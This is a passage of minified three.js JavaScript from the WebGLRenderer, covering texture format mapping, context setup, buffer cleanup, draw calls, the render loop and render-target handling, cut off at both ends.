t.COMPRESSED_RGBA_S3TC_DXT5_EXT}if(t=et.get("WEBGL_compressed_texture_pvrtc"),null!==t){if(e===THREE.RGB_PVRTC_4BPPV1_Format)return t.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(e===THREE.RGB_PVRTC_2BPPV1_Format)return t.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(e===THREE.RGBA_PVRTC_4BPPV1_Format)return t.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(e===THREE.RGBA_PVRTC_2BPPV1_Format)return t.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(t=et.get("EXT_blend_minmax"),null!==t){if(e===THREE.MinEquation)return t.MIN_EXT;if(e===THREE.MaxEquation)return t.MAX_EXT}return 0}function se(e){if(lt&&e&&e.skeleton&&e.skeleton.useVertexTexture)return 1024;var t=Ce.getParameter(Ce.MAX_VERTEX_UNIFORM_VECTORS),r=Math.floor((t-20)/4),i=r;return void 0!==e&&e instanceof THREE.SkinnedMesh&&(i=Math.min(e.skeleton.bones.length,i),i<e.skeleton.bones.length&&THREE.warn("WebGLRenderer: too many bones - "+e.skeleton.bones.length+", this GPU supports just "+i+" (try OpenGL instead of ANGLE)")),i}function he(e){for(var t=0,r=0,i=0,n=0,a=0,o=e.length;o>a;a++){var s=e[a];s.onlyShadow||s.visible===!1||(s instanceof THREE.DirectionalLight&&t++,s instanceof THREE.PointLight&&r++,s instanceof THREE.SpotLight&&i++,s instanceof THREE.HemisphereLight&&n++)}return{directional:t,point:r,spot:i,hemi:n}}function le(e){for(var t=0,r=0,i=e.length;i>r;r++){var n=e[r];n.castShadow&&(n instanceof THREE.SpotLight&&t++,n instanceof THREE.DirectionalLight&&!n.shadowCascade&&t++)}return t}console.log("THREE.WebGLRenderer",THREE.REVISION),e=e||{};var ce=void 0!==e.canvas?e.canvas:document.createElement("canvas"),ue=void 0!==e.context?e.context:null,Ee=1,fe=void 0!==e.precision?e.precision:"highp",pe=void 0!==e.alpha?e.alpha:!1,de=void 0!==e.depth?e.depth:!0,me=void 0!==e.stencil?e.stencil:!0,Te=void 0!==e.antialias?e.antialias:!1,ge=void 0!==e.premultipliedAlpha?e.premultipliedAlpha:!0,ve=void 0!==e.preserveDrawingBuffer?e.preserveDrawingBuffer:!1,Re=void 0!==e.logarithmicDepthBuffer?e.logarithmicDepthBuffer:!1,ye=new THREE.Color(0),He=0,xe=[],be={},_e=[],we=[],Me=[],Se=[],Ae=[];this.domElement=ce,this.context=null,this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.gammaFactor=2,this.gammaInput=!1,this.gammaOutput=!1,this.shadowMapEnabled=!1,this.shadowMapType=THREE.PCFShadowMap,this.shadowMapCullFace=THREE.CullFaceFront,this.shadowMapDebug=!1,this.shadowMapCascade=!1,this.maxMorphTargets=8,this.maxMorphNormals=4,this.autoScaleCubemaps=!0,this.info={memory:{programs:0,geometries:0,textures:0},render:{calls:0,vertices:0,faces:0,points:0}};var Ce,Le=this,Pe=[],Fe=null,Ue=null,Be=-1,De="",Ve=null,ze=0,ke=0,Ne=0,Oe=ce.width,Ge=ce.height,Ie=0,We=0,je=new THREE.Frustum,Xe=new THREE.Matrix4,qe=new THREE.Vector3,Ye=new THREE.Vector3,Ke=!0,Qe={ambient:[0,0,0],directional:{length:0,colors:[],positions:[]},point:{length:0,colors:[],positions:[],distances:[],decays:[]},spot:{length:0,colors:[],positions:[],distances:[],directions:[],anglesCos:[],exponents:[],decays:[]},hemi:{length:0,skyColors:[],groundColors:[],positions:[]}};try{var Ze={alpha:pe,depth:de,stencil:me,antialias:Te,premultipliedAlpha:ge,preserveDrawingBuffer:ve};if(Ce=ue||ce.getContext("webgl",Ze)||ce.getContext("experimental-webgl",Ze),null===Ce)throw null!==ce.getContext("webgl")?"Error creating WebGL context with your selected attributes.":"Error creating WebGL context.";ce.addEventListener("webglcontextlost",function(e){e.preventDefault(),it(),rt(),be={}},!1)}catch(Je){THREE.error("THREE.WebGLRenderer: "+Je)}var $e=new THREE.WebGLState(Ce,oe);void 0===Ce.getShaderPrecisionFormat&&(Ce.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}});var et=new THREE.WebGLExtensions(Ce);et.get("OES_texture_float"),et.get("OES_texture_float_linear"),et.get("OES_texture_half_float"),et.get("OES_texture_half_float_linear"),et.get("OES_standard_derivatives"),Re&&et.get("EXT_frag_depth");var tt=function(e,t,r,i){ge===!0&&(e*=i,t*=i,r*=i),Ce.clearColor(e,t,r,i)},rt=function(){Ce.clearColor(0,0,0,1),Ce.clearDepth(1),Ce.clearStencil(0),Ce.enable(Ce.DEPTH_TEST),Ce.depthFunc(Ce.LEQUAL),Ce.frontFace(Ce.CCW),Ce.cullFace(Ce.BACK),Ce.enable(Ce.CULL_FACE),Ce.enable(Ce.BLEND),Ce.blendEquation(Ce.FUNC_ADD),Ce.blendFunc(Ce.SRC_ALPHA,Ce.ONE_MINUS_SRC_ALPHA),Ce.viewport(ke,Ne,Oe,Ge),tt(ye.r,ye.g,ye.b,He)},it=function(){Fe=null,Ve=null,De="",Be=-1,Ke=!0,$e.reset()};rt(),this.context=Ce,this.state=$e;var nt=Ce.getParameter(Ce.MAX_TEXTURE_IMAGE_UNITS),at=Ce.getParameter(Ce.MAX_VERTEX_TEXTURE_IMAGE_UNITS),ot=Ce.getParameter(Ce.MAX_TEXTURE_SIZE),st=Ce.getParameter(Ce.MAX_CUBE_MAP_TEXTURE_SIZE),ht=at>0,lt=ht&&et.get("OES_texture_float"),ct=Ce.getShaderPrecisionFormat(Ce.VERTEX_SHADER,Ce.HIGH_FLOAT),ut=Ce.getShaderPrecisionFormat(Ce.VERTEX_SHADER,Ce.MEDIUM_FLOAT),Et=Ce.getShaderPrecisionFormat(Ce.FRAGMENT_SHADER,Ce.HIGH_FLOAT),ft=Ce.getShaderPrecisionFormat(Ce.FRAGMENT_SHADER,Ce.MEDIUM_FLOAT),pt=function(){var e;return function(){if(void 0!==e)return e;if(e=[],et.get("WEBGL_compressed_texture_pvrtc")||et.get("WEBGL_compressed_texture_s3tc"))for(var t=Ce.getParameter(Ce.COMPRESSED_TEXTURE_FORMATS),r=0;r<t.length;r++)e.push(t[r]);return e}}(),dt=ct.precision>0&&Et.precision>0,mt=ut.precision>0&&ft.precision>0;"highp"!==fe||dt||(mt?(fe="mediump",THREE.warn("THREE.WebGLRenderer: highp not supported, using mediump.")):(fe="lowp",THREE.warn("THREE.WebGLRenderer: highp and mediump not supported, using lowp."))),"mediump"!==fe||mt||(fe="lowp",THREE.warn("THREE.WebGLRenderer: mediump not supported, using lowp."));var Tt=new THREE.ShadowMapPlugin(this,xe,be,_e),gt=new THREE.SpritePlugin(this,Se),vt=new THREE.LensFlarePlugin(this,Ae);this.getContext=function(){return Ce},this.forceContextLoss=function(){et.get("WEBGL_lose_context").loseContext()},this.supportsVertexTextures=function(){return ht},this.supportsFloatTextures=function(){return et.get("OES_texture_float")},this.supportsHalfFloatTextures=function(){return et.get("OES_texture_half_float")},this.supportsStandardDerivatives=function(){return et.get("OES_standard_derivatives")},this.supportsCompressedTextureS3TC=function(){return et.get("WEBGL_compressed_texture_s3tc")},this.supportsCompressedTexturePVRTC=function(){return et.get("WEBGL_compressed_texture_pvrtc")},this.supportsBlendMinMax=function(){return et.get("EXT_blend_minmax")},this.getMaxAnisotropy=function(){var e;return function(){if(void 0!==e)return e;var t=et.get("EXT_texture_filter_anisotropic");return e=null!==t?Ce.getParameter(t.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0}}(),this.getPrecision=function(){return fe},this.getPixelRatio=function(){return Ee},this.setPixelRatio=function(e){Ee=e},this.setSize=function(e,t,r){ce.width=e*Ee,ce.height=t*Ee,r!==!1&&(ce.style.width=e+"px",ce.style.height=t+"px"),this.setViewport(0,0,e,t)},this.setViewport=function(e,t,r,i){ke=e*Ee,Ne=t*Ee,Oe=r*Ee,Ge=i*Ee,Ce.viewport(ke,Ne,Oe,Ge)},this.setScissor=function(e,t,r,i){Ce.scissor(e*Ee,t*Ee,r*Ee,i*Ee)},this.enableScissorTest=function(e){e?Ce.enable(Ce.SCISSOR_TEST):Ce.disable(Ce.SCISSOR_TEST)},this.getClearColor=function(){return ye},this.setClearColor=function(e,t){ye.set(e),He=void 0!==t?t:1,tt(ye.r,ye.g,ye.b,He)},this.getClearAlpha=function(){return He},this.setClearAlpha=function(e){He=e,tt(ye.r,ye.g,ye.b,He)},this.clear=function(e,t,r){var i=0;(void 0===e||e)&&(i|=Ce.COLOR_BUFFER_BIT),(void 0===t||t)&&(i|=Ce.DEPTH_BUFFER_BIT),(void 0===r||r)&&(i|=Ce.STENCIL_BUFFER_BIT),Ce.clear(i)},this.clearColor=function(){Ce.clear(Ce.COLOR_BUFFER_BIT)},this.clearDepth=function(){Ce.clear(Ce.DEPTH_BUFFER_BIT)},this.clearStencil=function(){Ce.clear(Ce.STENCIL_BUFFER_BIT)},this.clearTarget=function(e,t,r,i){this.setRenderTarget(e),this.clear(t,r,i)},this.resetGLState=it;var Rt=function(e){var t=e.target;t.traverse(function(e){e.removeEventListener("remove",Rt),L(e)})},yt=function(e){var t=e.target;t.removeEventListener("dispose",yt),wt(t)},Ht=function(e){var t=e.target;t.removeEventListener("dispose",Ht),Mt(t),Le.info.memory.textures--},xt=function(e){var t=e.target;t.removeEventListener("dispose",xt),St(t),Le.info.memory.textures--},bt=function(e){var t=e.target;t.removeEventListener("dispose",bt),At(t)},_t=function(e){for(var t=["__webglVertexBuffer","__webglNormalBuffer","__webglTangentBuffer","__webglColorBuffer","__webglUVBuffer","__webglUV2Buffer","__webglSkinIndicesBuffer","__webglSkinWeightsBuffer","__webglFaceBuffer","__webglLineBuffer","__webglLineDistanceBuffer"],r=0,i=t.length;i>r;r++){var n=t[r];void 0!==e[n]&&(Ce.deleteBuffer(e[n]),delete e[n])}if(void 0!==e.__webglCustomAttributesList){for(var n in e.__webglCustomAttributesList)Ce.deleteBuffer(e.__webglCustomAttributesList[n].buffer);delete e.__webglCustomAttributesList}Le.info.memory.geometries--},wt=function(e){if(delete e.__webglInit,e instanceof THREE.BufferGeometry){for(var t in e.attributes){var r=e.attributes[t];void 0!==r.buffer&&(Ce.deleteBuffer(r.buffer),delete r.buffer)}Le.info.memory.geometries--}else{var i=Ct[e.id];if(void 0!==i){for(var n=0,a=i.length;a>n;n++){var o=i[n];if(void 0!==o.numMorphTargets){for(var s=0,h=o.numMorphTargets;h>s;s++)Ce.deleteBuffer(o.__webglMorphTargetsBuffers[s]);delete o.__webglMorphTargetsBuffers}if(void 0!==o.numMorphNormals){for(var s=0,h=o.numMorphNormals;h>s;s++)Ce.deleteBuffer(o.__webglMorphNormalsBuffers[s]);delete o.__webglMorphNormalsBuffers}_t(o)}delete Ct[e.id]}else _t(e)}De=""},Mt=function(e){if(e.image&&e.image.__webglTextureCube)Ce.deleteTexture(e.image.__webglTextureCube),delete e.image.__webglTextureCube;else{if(void 0===e.__webglInit)return;Ce.deleteTexture(e.__webglTexture),delete e.__webglTexture,delete e.__webglInit}},St=function(e){if(e&&void 0!==e.__webglTexture){if(Ce.deleteTexture(e.__webglTexture),delete e.__webglTexture,e instanceof THREE.WebGLRenderTargetCube)for(var t=0;6>t;t++)Ce.deleteFramebuffer(e.__webglFramebuffer[t]),Ce.deleteRenderbuffer(e.__webglRenderbuffer[t]);else Ce.deleteFramebuffer(e.__webglFramebuffer),Ce.deleteRenderbuffer(e.__webglRenderbuffer);delete e.__webglFramebuffer,delete e.__webglRenderbuffer}},At=function(e){var t=e.program.program;if(void 0!==t){e.program=void 0;var r,i,n,a=!1;for(r=0,i=Pe.length;i>r;r++)if(n=Pe[r],n.program===t){n.usedTimes--,0===n.usedTimes&&(a=!0);break}if(a===!0){var o=[];for(r=0,i=Pe.length;i>r;r++)n=Pe[r],n.program!==t&&o.push(n);Pe=o,Ce.deleteProgram(t),Le.info.memory.programs--}}};this.renderBufferImmediate=function(e,t,r){if($e.initAttributes(),e.hasPositions&&!e.__webglVertexBuffer&&(e.__webglVertexBuffer=Ce.createBuffer()),e.hasNormals&&!e.__webglNormalBuffer&&(e.__webglNormalBuffer=Ce.createBuffer()),e.hasUvs&&!e.__webglUvBuffer&&(e.__webglUvBuffer=Ce.createBuffer()),e.hasColors&&!e.__webglColorBuffer&&(e.__webglColorBuffer=Ce.createBuffer()),e.hasPositions&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglVertexBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,e.positionArray,Ce.DYNAMIC_DRAW),$e.enableAttribute(t.attributes.position),Ce.vertexAttribPointer(t.attributes.position,3,Ce.FLOAT,!1,0,0)),e.hasNormals){if(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglNormalBuffer),r instanceof THREE.MeshPhongMaterial==!1&&r.shading===THREE.FlatShading){var i,n,a,o,s,h,l,c,u,E,f,p,d,m,T=3*e.count;for(m=0;T>m;m+=9)d=e.normalArray,o=d[m],l=d[m+1],E=d[m+2],s=d[m+3],c=d[m+4],f=d[m+5],h=d[m+6],u=d[m+7],p=d[m+8],i=(o+s+h)/3,n=(l+c+u)/3,a=(E+f+p)/3,d[m]=i,d[m+1]=n,d[m+2]=a,d[m+3]=i,d[m+4]=n,d[m+5]=a,d[m+6]=i,d[m+7]=n,d[m+8]=a}Ce.bufferData(Ce.ARRAY_BUFFER,e.normalArray,Ce.DYNAMIC_DRAW),$e.enableAttribute(t.attributes.normal),Ce.vertexAttribPointer(t.attributes.normal,3,Ce.FLOAT,!1,0,0)}e.hasUvs&&r.map&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglUvBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,e.uvArray,Ce.DYNAMIC_DRAW),$e.enableAttribute(t.attributes.uv),Ce.vertexAttribPointer(t.attributes.uv,2,Ce.FLOAT,!1,0,0)),e.hasColors&&r.vertexColors!==THREE.NoColors&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglColorBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,e.colorArray,Ce.DYNAMIC_DRAW),$e.enableAttribute(t.attributes.color),Ce.vertexAttribPointer(t.attributes.color,3,Ce.FLOAT,!1,0,0)),$e.disableUnusedAttributes(),Ce.drawArrays(Ce.TRIANGLES,0,e.count),e.count=0},this.renderBufferDirect=function(e,t,r,i,n,a){if(i.visible!==!1){S(a);var o=B(e,t,r,i,a),s=!1,h=i.wireframe?1:0,l="direct_"+n.id+"_"+o.id+"_"+h;if(l!==De&&(De=l,s=!0),s&&$e.initAttributes(),a instanceof THREE.Mesh){var c=i.wireframe===!0?Ce.LINES:Ce.TRIANGLES,u=n.attributes.index;if(u){var E,p;u.array instanceof Uint32Array&&et.get("OES_element_index_uint")?(E=Ce.UNSIGNED_INT,p=4):(E=Ce.UNSIGNED_SHORT,p=2);var d=n.offsets;if(0===d.length)s&&(f(i,o,n,0),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,u.buffer)),Ce.drawElements(c,u.array.length,E,0),Le.info.render.calls++,Le.info.render.vertices+=u.array.length,Le.info.render.faces+=u.array.length/3;else{s=!0;for(var m=0,T=d.length;T>m;m++){var g=d[m].index;s&&(f(i,o,n,g),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,u.buffer)),Ce.drawElements(c,d[m].count,E,d[m].start*p),Le.info.render.calls++,Le.info.render.vertices+=d[m].count,Le.info.render.faces+=d[m].count/3}}}else{s&&f(i,o,n,0);
var v=n.attributes.position;Ce.drawArrays(c,0,v.array.length/v.itemSize),Le.info.render.calls++,Le.info.render.vertices+=v.array.length/v.itemSize,Le.info.render.faces+=v.array.length/(3*v.itemSize)}}else if(a instanceof THREE.PointCloud){var c=Ce.POINTS,u=n.attributes.index;if(u){var E,p;u.array instanceof Uint32Array&&et.get("OES_element_index_uint")?(E=Ce.UNSIGNED_INT,p=4):(E=Ce.UNSIGNED_SHORT,p=2);var d=n.offsets;if(0===d.length)s&&(f(i,o,n,0),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,u.buffer)),Ce.drawElements(c,u.array.length,E,0),Le.info.render.calls++,Le.info.render.points+=u.array.length;else{d.length>1&&(s=!0);for(var m=0,T=d.length;T>m;m++){var g=d[m].index;s&&(f(i,o,n,g),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,u.buffer)),Ce.drawElements(c,d[m].count,E,d[m].start*p),Le.info.render.calls++,Le.info.render.points+=d[m].count}}}else{s&&f(i,o,n,0);var v=n.attributes.position,d=n.offsets;if(0===d.length)Ce.drawArrays(c,0,v.array.length/3),Le.info.render.calls++,Le.info.render.points+=v.array.length/3;else for(var m=0,T=d.length;T>m;m++)Ce.drawArrays(c,d[m].index,d[m].count),Le.info.render.calls++,Le.info.render.points+=d[m].count}}else if(a instanceof THREE.Line){var c=a.mode===THREE.LineStrip?Ce.LINE_STRIP:Ce.LINES;$e.setLineWidth(i.linewidth*Ee);var u=n.attributes.index;if(u){var E,p;u.array instanceof Uint32Array?(E=Ce.UNSIGNED_INT,p=4):(E=Ce.UNSIGNED_SHORT,p=2);var d=n.offsets;if(0===d.length)s&&(f(i,o,n,0),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,u.buffer)),Ce.drawElements(c,u.array.length,E,0),Le.info.render.calls++,Le.info.render.vertices+=u.array.length;else{d.length>1&&(s=!0);for(var m=0,T=d.length;T>m;m++){var g=d[m].index;s&&(f(i,o,n,g),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,u.buffer)),Ce.drawElements(c,d[m].count,E,d[m].start*p),Le.info.render.calls++,Le.info.render.vertices+=d[m].count}}}else{s&&f(i,o,n,0);var v=n.attributes.position,d=n.offsets;if(0===d.length)Ce.drawArrays(c,0,v.array.length/3),Le.info.render.calls++,Le.info.render.vertices+=v.array.length/3;else for(var m=0,T=d.length;T>m;m++)Ce.drawArrays(c,d[m].index,d[m].count),Le.info.render.calls++,Le.info.render.vertices+=d[m].count}}}},this.renderBuffer=function(e,t,r,i,n,a){if(i.visible!==!1){S(a);var o=B(e,t,r,i,a),s=o.attributes,h=!1,l=i.wireframe?1:0,c=n.id+"_"+o.id+"_"+l;if(c!==De&&(De=c,h=!0),h&&$e.initAttributes(),!i.morphTargets&&s.position>=0?h&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglVertexBuffer),$e.enableAttribute(s.position),Ce.vertexAttribPointer(s.position,3,Ce.FLOAT,!1,0,0)):a.morphTargetBase&&p(i,n,a),h){if(n.__webglCustomAttributesList)for(var u=0,E=n.__webglCustomAttributesList.length;E>u;u++){var f=n.__webglCustomAttributesList[u];s[f.buffer.belongsToAttribute]>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,f.buffer),$e.enableAttribute(s[f.buffer.belongsToAttribute]),Ce.vertexAttribPointer(s[f.buffer.belongsToAttribute],f.size,Ce.FLOAT,!1,0,0))}s.color>=0&&(a.geometry.colors.length>0||a.geometry.faces.length>0?(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglColorBuffer),$e.enableAttribute(s.color),Ce.vertexAttribPointer(s.color,3,Ce.FLOAT,!1,0,0)):void 0!==i.defaultAttributeValues&&Ce.vertexAttrib3fv(s.color,i.defaultAttributeValues.color)),s.normal>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglNormalBuffer),$e.enableAttribute(s.normal),Ce.vertexAttribPointer(s.normal,3,Ce.FLOAT,!1,0,0)),s.tangent>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglTangentBuffer),$e.enableAttribute(s.tangent),Ce.vertexAttribPointer(s.tangent,4,Ce.FLOAT,!1,0,0)),s.uv>=0&&(a.geometry.faceVertexUvs[0]?(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglUVBuffer),$e.enableAttribute(s.uv),Ce.vertexAttribPointer(s.uv,2,Ce.FLOAT,!1,0,0)):void 0!==i.defaultAttributeValues&&Ce.vertexAttrib2fv(s.uv,i.defaultAttributeValues.uv)),s.uv2>=0&&(a.geometry.faceVertexUvs[1]?(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglUV2Buffer),$e.enableAttribute(s.uv2),Ce.vertexAttribPointer(s.uv2,2,Ce.FLOAT,!1,0,0)):void 0!==i.defaultAttributeValues&&Ce.vertexAttrib2fv(s.uv2,i.defaultAttributeValues.uv2)),i.skinning&&s.skinIndex>=0&&s.skinWeight>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglSkinIndicesBuffer),$e.enableAttribute(s.skinIndex),Ce.vertexAttribPointer(s.skinIndex,4,Ce.FLOAT,!1,0,0),Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglSkinWeightsBuffer),$e.enableAttribute(s.skinWeight),Ce.vertexAttribPointer(s.skinWeight,4,Ce.FLOAT,!1,0,0)),s.lineDistance>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,n.__webglLineDistanceBuffer),$e.enableAttribute(s.lineDistance),Ce.vertexAttribPointer(s.lineDistance,1,Ce.FLOAT,!1,0,0))}if($e.disableUnusedAttributes(),a instanceof THREE.Mesh){var d=n.__typeArray===Uint32Array?Ce.UNSIGNED_INT:Ce.UNSIGNED_SHORT;i.wireframe?($e.setLineWidth(i.wireframeLinewidth*Ee),h&&Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,n.__webglLineBuffer),Ce.drawElements(Ce.LINES,n.__webglLineCount,d,0)):(h&&Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,n.__webglFaceBuffer),Ce.drawElements(Ce.TRIANGLES,n.__webglFaceCount,d,0)),Le.info.render.calls++,Le.info.render.vertices+=n.__webglFaceCount,Le.info.render.faces+=n.__webglFaceCount/3}else if(a instanceof THREE.Line){var m=a.mode===THREE.LineStrip?Ce.LINE_STRIP:Ce.LINES;$e.setLineWidth(i.linewidth*Ee),Ce.drawArrays(m,0,n.__webglLineCount),Le.info.render.calls++}else a instanceof THREE.PointCloud&&(Ce.drawArrays(Ce.POINTS,0,n.__webglParticleCount),Le.info.render.calls++,Le.info.render.points+=n.__webglParticleCount)}},this.render=function(e,t,r,i){if(t instanceof THREE.Camera==!1)return void THREE.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.");var n=e.fog;De="",Be=-1,Ve=null,Ke=!0,e.autoUpdate===!0&&e.updateMatrixWorld(),void 0===t.parent&&t.updateMatrixWorld(),e.traverse(function(e){e instanceof THREE.SkinnedMesh&&e.skeleton.update()}),t.matrixWorldInverse.getInverse(t.matrixWorld),Xe.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),je.setFromMatrix(Xe),xe.length=0,we.length=0,Me.length=0,Se.length=0,Ae.length=0,g(e),Le.sortObjects===!0&&(we.sort(d),Me.sort(m)),Tt.render(e,t),Le.info.render.calls=0,Le.info.render.vertices=0,Le.info.render.faces=0,Le.info.render.points=0,this.setRenderTarget(r),(this.autoClear||i)&&this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil);for(var a=0,o=_e.length;o>a;a++){var s=_e[a],h=s.object;h.visible&&(K(h,t),y(s))}if(e.overrideMaterial){var l=e.overrideMaterial;U(l),v(we,t,xe,n,l),v(Me,t,xe,n,l),R(_e,"",t,xe,n,l)}else $e.setBlending(THREE.NoBlending),v(we,t,xe,n,null),R(_e,"opaque",t,xe,n,null),v(Me,t,xe,n,null),R(_e,"transparent",t,xe,n,null);gt.render(e,t),vt.render(e,t,Ie,We),r&&r.generateMipmaps&&r.minFilter!==THREE.NearestFilter&&r.minFilter!==THREE.LinearFilter&&ne(r),$e.setDepthTest(!0),$e.setDepthWrite(!0),$e.setColorWrite(!0)},this.renderImmediateObject=function(e,t,r,i,n){var a=B(e,t,r,i,n);De="",Le.setMaterialFaces(i),n.immediateRenderCallback?n.immediateRenderCallback(a,Ce,je):n.render(function(e){Le.renderBufferImmediate(e,a,i)})};var Ct={},Lt=0,Pt={MeshDepthMaterial:"depth",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointCloudMaterial:"particle_basic"};this.setFaceCulling=function(e,t){e===THREE.CullFaceNone?Ce.disable(Ce.CULL_FACE):(t===THREE.FrontFaceDirectionCW?Ce.frontFace(Ce.CW):Ce.frontFace(Ce.CCW),e===THREE.CullFaceBack?Ce.cullFace(Ce.BACK):e===THREE.CullFaceFront?Ce.cullFace(Ce.FRONT):Ce.cullFace(Ce.FRONT_AND_BACK),Ce.enable(Ce.CULL_FACE))},this.setMaterialFaces=function(e){$e.setDoubleSided(e.side===THREE.DoubleSide),$e.setFlipSided(e.side===THREE.BackSide)},this.uploadTexture=function(e){void 0===e.__webglInit&&(e.__webglInit=!0,e.addEventListener("dispose",Ht),e.__webglTexture=Ce.createTexture(),Le.info.memory.textures++),Ce.bindTexture(Ce.TEXTURE_2D,e.__webglTexture),Ce.pixelStorei(Ce.UNPACK_FLIP_Y_WEBGL,e.flipY),Ce.pixelStorei(Ce.UNPACK_PREMULTIPLY_ALPHA_WEBGL,e.premultiplyAlpha),Ce.pixelStorei(Ce.UNPACK_ALIGNMENT,e.unpackAlignment),e.image=$(e.image,ot);var t=e.image,r=THREE.Math.isPowerOfTwo(t.width)&&THREE.Math.isPowerOfTwo(t.height),i=oe(e.format),n=oe(e.type);J(Ce.TEXTURE_2D,e,r);var a,o=e.mipmaps;if(e instanceof THREE.DataTexture)if(o.length>0&&r){for(var s=0,h=o.length;h>s;s++)a=o[s],Ce.texImage2D(Ce.TEXTURE_2D,s,i,a.width,a.height,0,i,n,a.data);e.generateMipmaps=!1}else Ce.texImage2D(Ce.TEXTURE_2D,0,i,t.width,t.height,0,i,n,t.data);else if(e instanceof THREE.CompressedTexture)for(var s=0,h=o.length;h>s;s++)a=o[s],e.format!==THREE.RGBAFormat&&e.format!==THREE.RGBFormat?pt().indexOf(i)>-1?Ce.compressedTexImage2D(Ce.TEXTURE_2D,s,i,a.width,a.height,0,a.data):THREE.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):Ce.texImage2D(Ce.TEXTURE_2D,s,i,a.width,a.height,0,i,n,a.data);else if(o.length>0&&r){for(var s=0,h=o.length;h>s;s++)a=o[s],Ce.texImage2D(Ce.TEXTURE_2D,s,i,i,n,a);e.generateMipmaps=!1}else Ce.texImage2D(Ce.TEXTURE_2D,0,i,i,n,e.image);e.generateMipmaps&&r&&Ce.generateMipmap(Ce.TEXTURE_2D),e.needsUpdate=!1,e.onUpdate&&e.onUpdate()},this.setTexture=function(e,t){Ce.activeTexture(Ce.TEXTURE0+t),e.needsUpdate?Le.uploadTexture(e):Ce.bindTexture(Ce.TEXTURE_2D,e.__webglTexture)},this.setRenderTarget=function(e){var t=e instanceof THREE.WebGLRenderTargetCube;if(e&&void 0===e.__webglFramebuffer){void 0===e.depthBuffer&&(e.depthBuffer=!0),void 0===e.stencilBuffer&&(e.stencilBuffer=!0),e.addEventListener("dispose",xt),e.__webglTexture=Ce.createTexture(),Le.info.memory.textures++;var r=THREE.Math.isPowerOfTwo(e.width)&&THREE.Math.isPowerOfTwo(e.height),i=oe(e.format),n=oe(e.type);if(t){e.__webglFramebuffer=[],e.__webglRenderbuffer=[],Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,e.__webglTexture),J(Ce.TEXTURE_CUBE_MAP,e,r);for(var a=0;6>a;a++)e.__webglFramebuffer[a]=Ce.createFramebuffer(),e.__webglRenderbuffer[a]=Ce.createRenderbuffer(),Ce.texImage2D(Ce.TEXTURE_CUBE_MAP_POSITIVE_X+a,0,i,e.width,e.height,0,i,n,null),re(e.__webglFramebuffer[a],e,Ce.TEXTURE_CUBE_MAP_POSITIVE_X+a),ie(e.__webglRenderbuffer[a],e);r&&Ce.generateMipmap(Ce.TEXTURE_CUBE_MAP)}else e.__webglFramebuffer=Ce.createFramebuffer(),e.shareDepthFrom?e.__webglRenderbuffer=e.shareDepthFrom.__webglRenderbuffer:e.__webglRenderbuffer=Ce.createRenderbuffer(),Ce.bindTexture(Ce.TEXTURE_2D,e.__webglTexture),J(Ce.TEXTURE_2D,e,r),Ce.texImage2D(Ce.TEXTURE_2D,0,i,e.width,e.height,0,i,n,null),re(e.__webglFramebuffer,e,Ce.TEXTURE_2D),e.shareDepthFrom?e.depthBuffer&&!e.stencilBuffer?Ce.framebufferRenderbuffer(Ce.FRAMEBUFFER,Ce.DEPTH_ATTACHMENT,Ce.RENDERBUFFER,e.__webglRenderbuffer):e.depthBuffer&&e.stencilBuffer&&Ce.framebufferRenderbuffer(Ce.FRAMEBUFFER,Ce.DEPTH_STENCIL_ATTACHMENT,Ce.RENDERBUFFER,e.__webglRenderbuffer):ie(e.__webglRenderbuffer,e),r&&Ce.generateMipmap(Ce.TEXTURE_2D);t?Ce.bindTexture(Ce.TEXTURE_CUBE_MAP,null):Ce.bindTexture(Ce.TEXTURE_2D,null),Ce.bindRenderbuffer(Ce.RENDERBUFFER,null),Ce.bindFramebuffer(Ce.FRAMEBUFFER,null)}var o,s,h,l,c;e?(o=t?e.__webglFramebuffer[e.activeCubeFace]:e.__webglFramebuffer,s=e.width,h=e.height,l=0,c=0):(o=null,s=Oe,h=Ge,l=ke,c=Ne),o!==Ue&&(Ce.bindFramebuffer(Ce.FRAMEBUFFER,o),Ce.viewport(l,c,s,h),Ue=o),Ie=s,We=h},this.readRenderTargetPixels=function(e,t,r,i,n,a){if(!(e instanceof 